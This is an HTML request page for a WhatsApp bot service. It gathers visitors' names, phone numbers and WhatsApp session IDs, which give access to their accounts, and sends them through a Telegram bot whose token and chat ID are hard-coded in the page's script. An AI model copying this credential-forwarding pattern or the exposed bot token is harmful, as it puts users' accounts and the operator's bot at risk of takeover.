<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Telegram Bot Request - Don 14 Solutions</title>
<link rel="icon" href="https://files.catbox.moe/p878gt.jpg" type="image/png">
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:"Poppins",sans-serif;}
body{background:linear-gradient(135deg,#00b8a9,#00695c);color:#fff;overflow-x:hidden;}
header{text-align:center;padding:40px 20px 20px;position:relative;}
header img{width:90px;border-radius:50%;box-shadow:0 0 20px rgba(255,255,255,0.3);}
header h1{font-size:1.9rem;margin-top:10px;font-weight:700;}
header p{color:#e8fff2;margin-bottom:10px;}
.back-btn{position:absolute;left:25px;top:25px;background:#ffffff22;color:#fff;padding:8px 18px;border-radius:20px;text-decoration:none;font-size:0.9rem;transition:0.3s;border:1px solid #fff3;}
.back-btn:hover{background:#ffffff44;}
.form-section{background:#fff;color:#333;max-width:800px;margin:40px auto;border-radius:20px;padding:30px 25px;box-shadow:0 6px 25px rgba(0,0,0,0.15);animation:fadeIn .8s ease;}
@keyframes fadeIn{from{opacity:0;transform:translateY(30px);}to{opacity:1;transform:translateY(0);}}
.form-section h2{text-align:center;margin-bottom:15px;color:#00796b;}
label{display:block;margin:12px 0 5px;font-weight:600;}
input,textarea,select{width:100%;padding:10px 12px;border:2px solid #ccc;border-radius:10px;font-size:1rem;outline:none;transition:.3s;margin-bottom:10px;}
input:focus,textarea:focus,select:focus{border-color:#00bfa5;}
button{background:#00bfa5;color:#fff;border:none;width:100%;padding:14px;border-radius:12px;font-size:1.1rem;margin-top:20px;cursor:pointer;font-weight:600;transition:.3s;}
button:hover{background:#00997e;transform:scale(1.02);}
footer{text-align:center;padding:30px;color:#d4ffe5;}
.hidden{display:none;}
.yesno-btns{display:flex;gap:10px;margin-bottom:10px;}
.yesno-btns button{flex:1;}
.link-box{display:flex;align-items:center;justify-content:space-between;background:#f5f5f5;border-radius:10px;padding:8px 12px;margin:8px 0;}
.link-box a{color:#00796b;text-decoration:none;word-break:break-all;}
.copy-btn{background:#00bfa5;color:#fff;border:none;padding:6px 12px;border-radius:8px;cursor:pointer;font-size:0.8rem;}
.copy-btn:hover{background:#00997e;}
.images-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:10px;margin-top:15px;}
.images-grid img{width:100%;border-radius:10px;cursor:pointer;transition:transform .3s;}
.images-grid img:hover{transform:scale(1.05);}
.paste-btn{background:#00695c;color:#fff;border:none;padding:10px 14px;border-radius:10px;margin-top:10px;cursor:pointer;}
</style>
</head>
<body>

<header>
<a href="index.html" class="back-btn">⬅ Back to Home</a>
<img src="https://files.catbox.moe/p878gt.jpg" alt="Don 14 Logo">
<h1>WhatsApp Bot</h1>
<p>Configure your Bot features and send for deployment </p>
</header>

<section class="form-section">
<h2>Bot Linking Knowledge</h2>
<p>Do you know how to link your WhatsApp Bot?</p>
<div class="yesno-btns">
  <button onclick="linkKnowledge(true)">Yes</button>
  <button onclick="linkKnowledge(false)">No</button>
</div>

<div id="linkInstructions" class="hidden"></div>

<h2>Main Bot Features</h2>
<form id="botForm">
<label>Your Name</label>
<input type="text" id="botName" placeholder="Write your bot name">
<!-- ... (keep rest of your existing form unchanged) ... -->
<label>Full Name</label>
<input type="text" id="fullName" placeholder="Enter your full name">
<label>Phone Number</label>
<input type="tel" id="phone" placeholder="Enter your contact number">
<button type="button" onclick="sendTelegramRequest()">Send Request</button>
</form>
</section>

<footer>&copy; 2025 Don 14 Solutions. All Rights Reserved.</footer>

<script>
const pairLinks=[
  "https://pair1-668e0d.platform.cypherx.space/",
  "https://pair2-99f975.platform.cypherx.space/",
  "https://pair3-847d7a.platform.cypherx.space/",
  "https://pair4-0c9e3e.platform.cypherx.space/",
  "https://pair5-9e3aff.platform.cypherx.space/"
];
const screenshots=[
  "https://files.catbox.moe/isy8o5.jpg",
  "https://files.catbox.moe/isy8o5.jpg",
  "https://files.catbox.moe/6u37fd.jpg",
  "https://files.catbox.moe/pzir8a.jpg",
  "https://files.catbox.moe/z82s9a.jpg",
  "https://files.catbox.moe/s3v7ge.jpg"
];
let knowsLink=false;

function linkKnowledge(answer){
  knowsLink=answer;
  const container=document.getElementById("linkInstructions");
  container.innerHTML=""; // clear
  container.classList.remove("hidden");

  // Build pair links section
  const title=document.createElement("p");
  title.textContent="Use any of the following Pair Code Generators:";
  container.appendChild(title);

  pairLinks.forEach(link=>{
    const box=document.createElement("div");
    box.className="link-box";
    box.innerHTML=`<a href="${link}" target="_blank">${link}</a>
      <button class="copy-btn" onclick="copyLink('${link}',this)">Copy</button>`;
    container.appendChild(box);
  });

  const sessionLabel=document.createElement("p");
  sessionLabel.innerHTML='Paste your <strong>Session ID</strong> below:';
  container.appendChild(sessionLabel);

  const input=document.createElement("input");
  input.id="sessionID";
  input.placeholder="Enter Session ID";
  container.appendChild(input);

  if(!answer){
    // show screenshots
    const imgGrid=document.createElement("div");
    imgGrid.className="images-grid";
    screenshots.forEach(src=>{
      const img=document.createElement("img");
      img.src=src;
      img.onclick=()=>window.open(src,"_blank");
      imgGrid.appendChild(img);
    });
    container.appendChild(imgGrid);

    // paste button
    const pasteBtn=document.createElement("button");
    pasteBtn.type="button";
    pasteBtn.className="paste-btn";
    pasteBtn.textContent="📋 Paste Session ID";
    pasteBtn.onclick=async()=>{
      try{
        const text=await navigator.clipboard.readText();
        input.value=text;
      }catch(err){
        alert("Clipboard access denied. Paste manually.");
      }
    };
    container.appendChild(pasteBtn);
  }
}

function copyLink(link,btn){
  navigator.clipboard.writeText(link).then(()=>{
    btn.textContent="Copied!";
    btn.style.background="#4CAF50";
    setTimeout(()=>{btn.textContent="Copy";btn.style.background="#00bfa5";},1500);
  });
}

function sendTelegramRequest(){
  const botToken="8372924450:AAGgPPZ_mpdORPZG2PVaDOt9ymUeE2RVfoE";   // replace
  const chatId="8049244190";       // replace
  const botName=document.getElementById("botName").value.trim();
  const sessionID=document.getElementById("sessionID")?.value.trim()||"";
  const fullName=document.getElementById("fullName").value.trim();
  const phone=document.getElementById("phone").value.trim();
  if(!botName||!fullName||!phone){alert("Please fill required fields.");return;}
  if(knowsLink&& !sessionID){alert("Please enter your Session ID.");return;}

  const message=`🧾 New Bot Request%0AName: ${botName}%0AFull Name: ${fullName}%0APhone: ${phone}%0ASession: ${sessionID||"None"}`;
  fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`)
    .then(r=>r.ok?alert("✅ Sent "):alert("⚠️ Failed to send"))
    .catch(e=>alert("Error: "+e));
}
</script>
</body>
</html>
